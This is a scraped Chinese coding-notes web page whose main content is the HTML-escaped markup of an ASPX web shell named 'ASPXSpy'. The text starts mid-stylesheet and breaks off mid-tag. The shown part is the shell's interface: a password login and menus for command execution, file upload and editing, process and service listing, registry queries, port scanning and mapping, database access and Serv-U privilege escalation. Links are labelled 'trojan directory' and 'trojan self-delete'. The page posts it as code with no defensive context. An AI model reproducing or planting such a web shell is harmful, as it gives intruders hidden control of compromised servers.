#fff;}<BR>.area{font-size: 12px;background-color:#ddd;border:1px solid #fff;padding:2px;}<BR>.bt {font-size: 12px;background-color:#ddd;border:1px solid #fff;}<BR>a {color:lime;text-decoration: none;}a:hover{color:lime;}<BR>.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#003300;padding:5px 10px 5px 5px;}<BR>.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#003300;padding:5px 10px 5px 5px;}<BR>.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#015201;padding:5px 10px 5px 5px;}<BR>.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#073b07;padding:5px 10px 5px 5px;font-weight:bold;}<BR>.head td span{font-weight:normal;}<BR>form{margin:0;padding:0;}<BR>h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:lime;}<BR>ul.info li{margin:0;color:lime;line-height:24px;height:24px;}<BR>u{text-decoration: none;color:lime;float:left;display:block;width:150px;margin-right:10px;}<BR>.u1{text-decoration: none;color:lime;float:left;display:block;width:150px;margin-right:10px;}<BR>.u2{text-decoration: none;color:lime;float:left;display:block;width:350px;margin-right:10px;}<BR>&lt;/style&gt;<BR>&lt;script type="text/javascript"&gt;<BR>function CheckAll(form){<BR>for(var i=0;i&lt;form.elements.length;i++){<BR>var e=form.elements[i];<BR>if(e.name!='chkall')<BR>e.checked=form.chkall.checked;<BR>}<BR>}<BR>&lt;/script&gt;<BR>&lt;/head&gt;<BR>&lt;body style="margin:0;table-layout:fixed;"&gt;<BR>&lt;form id="ASPXSpy" runat="server"&gt;<BR>&lt;div id="ljtzC" runat="server" style=" margin:15px" enableviewstate="false" visible="false" &gt;<BR>&lt;span style="font:11px Verdana;"&gt;Password:&lt;/span&gt;<BR>&lt;asp:TextBox ID="HRJ" runat="server" Columns="20" CssClass="Bin_Style_Login" &gt;&lt;/asp:TextBox&gt;<BR>&lt;asp:Button ID="ZSnXu" runat="server" Text="Login" CssClass="Bin_Style_Login" OnClick="xVm"/&gt;&lt;p/&gt;<BR>&lt;/div&gt;<BR>&lt;div id="ZVS" runat="server"&gt;<BR>&lt;div id="Zzj" runat="server"&gt;<BR>&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;<BR>&lt;tr class="head"&gt;<BR>&lt;td &gt;&lt;span style="float:right;"&gt;&lt;a href="http://www.on-e.cn" target="_blank"&gt;☆銥繎夶蟲___Ёnd&lt;/a&gt;&lt;/span&gt;&lt;span id="Bin_Span_Sname" runat="server" enableviewstate="true"&gt;&lt;/span&gt;&lt;/td&gt;<BR>&lt;/tr&gt;<BR>&lt;tr class="alt1"&gt;<BR>&lt;td&gt;&lt;span style="float:right;" id="Bin_Span_FrameVersion" runat="server"&gt;&lt;/span&gt;<BR>&lt;asp:LinkButton ID="UtkN" runat="server" OnClick="YKpI" Text="退出登录" &gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="RsqhW" runat="server" Text="文件(夹)管理" OnClick="Ybg"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="xxzE" runat="server" Text="Cmd命令" OnClick="VOxn"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="nuc" runat="server" Text="IIS探测" OnClick="KjPi"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="OREpx" runat="server" Text="系统进程" OnClick="Grxk"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="jHN" runat="server" Text="系统服务" OnClick="ilC"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="PHq" runat="server" Text="用户(组)信息" OnClick="Olm"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="wmgnK" runat="server" Text="系统信息" OnClick="HtB"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="FeV" runat="server" Text="文件搜索" OnClick="PPtK"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="PVQ" runat="server" Text="Serv-U提权" OnClick="jXhS"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="jNDb" runat="server" Text="注册表查询" OnClick="xSy"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="HDQ" runat="server" Text="端口扫描" OnClick="cptS" &gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="AoI" runat="server" Text="数据库管理" OnClick="dMx"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="KHbEd" runat="server" Text="端口映射" OnClick="fDO"&gt;&lt;/asp:LinkButton&gt;<BR>&lt;/td&gt;<BR>&lt;/tr&gt;<BR>&lt;/table&gt;<BR>&lt;/div&gt;<BR>&lt;table width="100%" border="0" cellpadding="15" cellspacing="0"&gt;&lt;tr&gt;&lt;td&gt;<BR>&lt;div id="jDKt" style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" enableviewstate="false"&gt;&lt;/div&gt;<BR>&lt;h2 id="Bin_H2_Title" runat="server"&gt;&lt;/h2&gt;<BR>&lt;%--FileList--%&gt;<BR>&lt;div id="CzfO" runat="server"&gt;<BR>&lt;table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;"&gt;<BR>&nbsp;&lt;tr&gt;<BR>&lt;td style=" white-space:nowrap"&gt;当前目录 : &lt;/td&gt;<BR>&lt;td style=" width:100%"&gt;&lt;input class="input" id="AXSbb" type="text" style="width:97%;margin:0 8px;" runat="server"/&gt;<BR>&lt;/td&gt;<BR>&lt;td style="white-space:nowrap" &gt;&lt;asp:Button ID="xaGwl" runat="server" Text="Go" CssClass="bt" OnClick="EXV"/&gt;&lt;/td&gt;<BR>&nbsp;&lt;/tr&gt;<BR>&lt;/table&gt;<BR>&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;<BR>&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;"&gt;<BR>&lt;div style="float:right;"&gt;&lt;input id="Fhq" class="input" runat="server" type="file" style=" height:22px"/&gt;<BR>&lt;asp:Button ID="RvPp" CssClass="bt" runat="server" Text="上传" OnClick="lbjLD"/&gt;&lt;/div&gt;&lt;asp:LinkButton ID="OLJFp" runat="server" Text="网站目录" OnClick="mcCY"&gt;&lt;/asp:LinkButton&gt; | &lt;a href="#" id="Bin_Button_CreateDir" runat="server"&gt;木马目录&lt;/a&gt; | &lt;a href="#" id="Bin_Button_CreateFile" runat="server"&gt;新建目录&lt;/a&gt;<BR>&nbsp;| &lt;span id="Bin_Span_Drv" runat="server"&gt;&lt;/span&gt;&lt;a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red"&gt;木马自杀&lt;/a&gt;<BR>&lt;/td&gt;&lt;/tr&gt;<BR>&lt;asp:Table ID="UGzP" runat="server" Width="100%" CellSpacing="0" &gt;<BR>&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell&gt;&nbsp;&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;文件(夹)名&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="25%"&gt;最后修改时间&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="15%"&gt;大小&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="25%"&gt;操作&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;<BR>&lt;/asp:Table&gt;<BR>&lt;/table&gt;<BR>&lt;/div&gt;<BR>&lt;%--FileEdit--%&gt;<BR>&lt;div id="vrFA" runat="server"&gt;<BR>&lt;p&gt;当前文件（创建新的文件名和新文件）&lt;br/&gt;<BR>&lt;input class="input" id="Sqon" type="text" size="100" runat="server"/&gt; &lt;asp:DropDownList ID="NdCX" runat="server" CssClass="list" AutoPostBack="true" OnSelectedIndexChanged="zOVO"&gt;&lt;asp:ListItem&gt;Default&lt;/asp:ListItem&gt;&lt;asp:L
<hr></span>                                     
		    	</div>
		    	<div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>代码注释</div>
			    <div class="panel-content">
			    <span></span>                                     
		    	</div>

			</div>

			<!-- END ROW -->
			<div class="newsPage">
				<div class="newsPageTurn">
				    <span><a>上一篇</a><a href='/php/biji/101520.html'>如何获取select下拉框的值(option没有及有value属性)</a><a>下一篇</a><a href='/php/biji/101522.html'>日常收集整理php正则表达式(超常用)</a></span>
				</div>
			</div>
		</div>


<div id="author-box">
    <h3>作者：喵哥笔记</h3>
        <div class="author-info">
            <div class="author-avatar">
                <img src="/skin1/picture/01.jpg" alt="IDC笔记" class="avatar" width="64" height="64">
            </div>
        <div class="author-description">
            <p>学的不仅是技术，更是梦想！</p>
            <ul class="author-social follows nb">
            	<li>
                    <a target="_blank" href="/" title="IDC笔记">IDC笔记</a>
                </li>
            </ul>
        </div>
        <div class="clear"></div>
    </div>
</div>
<script>
var paras = document.getElementsByTagName("pre");
for ( var i=0;i<paras.length;i++ ) {
    paras[i].setAttribute("class","brush:php;toolbar:false");     
}
</script>
<!-- container-fluid -->
	</div>
<!-- content -->
	<footer class="footer">
	© 2020 IDC笔记 <i class="mdi mdi-heart text-danger"></i>. | 备案号：<a href="https://beian.miit.gov.cn/">辽ICP备18000516号</a>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?674585fbbd2294d3faf910f668ea91b4";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

	</footer>
</div>

</div>
<!-- END wrapper -->
<!-- jQuery  -->
<script src="/skin1/js/jquery.min.js"></script>
<script src="/skin1/js/bootstrap.bundle.min.js"></script>
<script src="/skin1/js/metismenu.min.js"></script>
<script src="/skin1/js/jquery.slimscroll.js"></script>
<script src="/skin1/js/waves.min.js"></script>
<!--Morris Chart-->
<script src="/skin1/js/morris.min.js"></script>
<script src="/skin1/js/raphael.min.js"></script>
<script src="/skin1/js/dashboard.init.js"></script>
<script src="/skin1/js/app.js"></script>
<script src="/foot.js"></script>
</body>
</html>